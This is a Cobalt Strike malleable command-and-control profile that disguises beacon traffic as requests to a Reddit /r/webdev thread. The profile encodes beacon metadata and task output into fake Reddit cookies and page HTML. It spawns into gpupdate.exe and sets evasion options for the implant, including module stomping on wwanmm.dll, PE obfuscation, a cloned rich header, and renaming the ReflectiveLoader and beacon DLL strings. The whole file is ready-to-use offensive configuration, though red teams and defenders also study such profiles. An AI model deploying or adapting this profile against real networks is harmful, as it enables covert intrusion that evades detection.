#reddit profile
#from /r/webdev and random comment
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36";
set dns_idle "8.8.8.8";
set maxdns    "235";


http-get {

    set uri "/r/webdev/comments/95ltyr";
    
    client {

	header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
	
        
        metadata {
            base64url;
	    prepend "session_tracker=";
	    prepend "0001eqt60.2.1;";
	    prepend "loid=";
	    append ";rseor3=";
	    append "true";
	    append ";reddaid=";
	    append "SHXIJU204B";
	    	    
	    header "Cookie";

        }

    }

    server {

	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
        
        output {

            base64url;
	    prepend "<!DOCTYPE html><html lang=\"en\"><head><title>Has anyone else noticed slow loading of Google fonts across the board? : webdev</title><meta charSet=\"utf8\"/><meta name=\"viewport\" content=";
	    append "</script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/runtime.24e5d569e89bb0cc0439.js\"></script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/vendors~Profile~ProfileHomepage~ProfilePostComments~R2CommentsPage~R2Listing~Reddit.ab6e733968a19bb51c3a.js\"></script><script defer=\"\" type=\"text/javascript\"";

            print;
        }
    }
}

http-post {
    
    set uri "/r/webdev/comments/95ltyr/slow_loading_of_google";
    set verb "GET";

    client {

	header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";     
        
        output {
            base64url;
	    
	    prepend "session_tracker=";
	    prepend "0001eqt60.2.1;";
	    prepend "loid=";
	    append ";rseor3=";
	    append "true";
	    append ";reddaid=";
	    append "SHXIJU204B";
	    
	    
	    header "Cookie";


        }


        id {
	    base64url;
	    parameter "id";

        }
    }

    server {

	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
        

        output {
            base64url;
	    prepend "<!DOCTYPE html><html lang=\"en\"><head><title>Has anyone else noticed slow loading of Google fonts across the board? : webdev</title><meta charSet=\"utf8\"/><meta name=\"viewport\" content=";
	    append "</script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/runtime.24e5d569e89bb0cc0439.js\"></script><script defer=\"\" type=\"text/javascript\" src=\"https://www.redditstatic.com/desktop2x/vendors~Profile~ProfileHomepage~ProfilePostComments~R2CommentsPage~R2Listing~Reddit.ab6e733968a19bb51c3a.js\"></script><script defer=\"\" type=\"text/javascript\"";
	   
            print;
        }
    }
}

http-stager {

    set uri_x86 "/r/Webdev";
    set uri_x64 "/r/WebDev";

    client {
	header "Host" "www.reddit.com";
	header "Accept" "*/*";
	header "Accept-Language" "en-US";
	header "Connection" "close";
    }

    server {
	header "Cache-control" "private, s-maxage=0, max-age=0, must-revalidate";
	header "Content-Type" "text/html; charset=utf-8";
    
    }


}

###Malleable PE Options###

set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";

#used peclone on wwanmm.dll. 
#don't use 'set image_size_xx' if using 'set module_xx'
stage {
	set checksum       "0";
	set compile_time   "25 Oct 2016 01:57:23";
	set entry_point    "170000";
#	set image_size_x86 "6586368";
#	set image_size_x64 "6586368";
#	set name	   "WWanMM.dll";
	set userwx 	   "false";
	set cleanup	   "true";
	set stomppe	   "true";
	set obfuscate	   "true";
	set rich_header    "\xee\x50\x19\xcf\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xaa\x31\x77\x9c\xa3\x49\xe4\x9c\x84\x31\x77\x9c\x1e\xad\x86\x9c\xae\x31\x77\x9c\x1e\xad\x85\x9c\xa7\x31\x77\x9c\xaa\x31\x76\x9c\x08\x31\x77\x9c\x1e\xad\x98\x9c\xa3\x31\x77\x9c\x1e\xad\x84\x9c\x98\x31\x77\x9c\x1e\xad\x99\x9c\xab\x31\x77\x9c\x1e\xad\x80\x9c\x6d\x31\x77\x9c\x1e\xad\x9a\x9c\xab\x31\x77\x9c\x1e\xad\x87\x9c\xab\x31\x77\x9c\x52\x69\x63\x68\xaa\x31\x77\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";


#module stomp

#don't use 'set image_size_xx' if using 'set module_xx'
	set module_x86 "wwanmm.dll";
	set module_x64 "wwanmm.dll";

	transform-x86 {
	    strrep "ReflectiveLoader" "";
	    strrep "beacon.dll" "winsku.dll";
	}

	transform-x64 {
	    strrep "ReflectiveLoader" "";
	    strrep "beacon.64.dll" "winsockhc.dll";
	}
}
